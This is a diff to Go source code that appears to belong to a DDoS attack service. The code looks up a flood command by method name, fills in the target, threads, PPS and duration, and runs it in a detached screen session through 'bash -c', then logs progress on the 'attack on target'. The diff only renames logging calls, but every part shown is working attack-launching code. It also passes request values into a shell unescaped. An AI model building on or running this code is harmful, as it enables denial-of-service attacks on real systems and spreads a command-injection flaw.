@@ -8,6 +8,7 @@ import (
 	"strconv"
 	"strings"
 	"time"
+	"api/core/models/log"
 )
 
 var ongoing map[string]*attack
@@ -25,17 +26,17 @@ func Attack(atk *AttackMessage) {
 	threads, _ := strconv.Atoi(atk.Options.Threads)
 	if threads > Config.MThread {
 		threads = Config.MThread
-		logger.Printf("Max Threads for servers auto-set to %d", Config.MThread)
+		log.Printf("Max Threads for servers auto-set to %d", Config.MThread)
 	}
 	atk.Options.Threads = strconv.Itoa(threads)
 	command, found := methods[strings.ToUpper(atk.Data.Method)]
 if !found {
-    logger.Println("Method not found:", atk.Data.Method)
+    log.Println("Method not found:", atk.Data.Method)
     return
 }
 cmdStr, ok := command.(string)
 if !ok {
-    logger.Println("Command is not a valid string:", command)
+    log.Println("Command is not a valid string:", command)
     return
 }
 	replace := strings.NewReplacer(
@@ -46,7 +47,7 @@ if !ok {
 		"$pps", atk.Options.PPS,
 	)
 	commandnew := replace.Replace(cmdStr)
-	logger.Println("Final command:", commandnew)
+	log.Println("Final command:", commandnew)
 	duration, _ := strconv.Atoi(atk.Data.Duration)
 
 	a := &attack{
@@ -63,17 +64,17 @@ if !ok {
 func (atk *attack) flood(ctx context.Context, commandnew string) {
     // Create the bash command string for starting the screen session.
 	cmdStr := fmt.Sprintf("screen -dmS Atk %s", commandnew)
-	logger.Println("Executing command:", cmdStr)
+	log.Println("Executing command:", cmdStr)
 
 	// Execute the bash command to start the attack in a detached screen session.
 	cmd := exec.Command("bash", "-c", cmdStr)
 	cmd.Stdout, cmd.Stderr = os.Stdout, os.Stderr
 	if err := cmd.Start(); err != nil {
-		logger.Println("Error executing command:", err)
+		log.Println("Error executing command:", err)
 	} else {
 		currentDir, _ := os.Getwd()
-		logger.Println("Current working directory:", currentDir)
-		logger.Println("Successfully started attack on target:", atk.target)
+		log.Println("Current working directory:", currentDir)
+		log.Println("Successfully started attack on target:", atk.target)
 	}
 
 	// Start a new goroutine to monitor the attack status
@@ -85,12 +86,12 @@ func (atk *attack) flood(ctx context.Context, commandnew string) {
 			select {
 			case <-ticker.C:
 				// Log periodic updates about the ongoing attack
-				logger.Println("Attack on target:", atk.target, "is still ongoing")
+				log.Println("Attack on target:", atk.target, "is still ongoing")
 				
 				// Check if the attack duration has passed
 				if time.Now().Unix() > atk.end {
 					// Attack has finished, log the end message
-					logger.Println("Attack finished on target:", atk.target)
+					log.Println("Attack finished on target:", atk.target)
 					return // Exit the goroutine once the attack is over
 				}
 			}
